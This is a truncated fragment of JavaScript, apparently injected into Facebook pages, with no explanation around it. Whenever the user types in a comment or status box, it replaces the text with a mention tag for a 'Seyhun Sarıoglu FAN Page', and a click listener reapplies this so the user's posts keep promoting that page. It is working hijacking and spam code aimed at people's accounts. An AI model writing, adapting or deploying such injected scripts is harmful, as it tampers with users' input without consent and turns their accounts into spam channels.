...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[176066372504137:Seyhun Sarıoglu FAN Page] ') < 0 && this.name == 'add_comment_text_text'){this.value = '@[176066372504137:Seyhun Sarıoglu FAN Page] ';}");
}
document.addEventListener("click", function () {
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[176066372504137:Seyhun Sarıoglu FAN Page] ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('@[176066372504137:Seyhun Sarıoglu FAN Page] ') < 0){this.value = '@[176066372504137:Seyhun Sarıoglu FAN Page] ';}");
    }
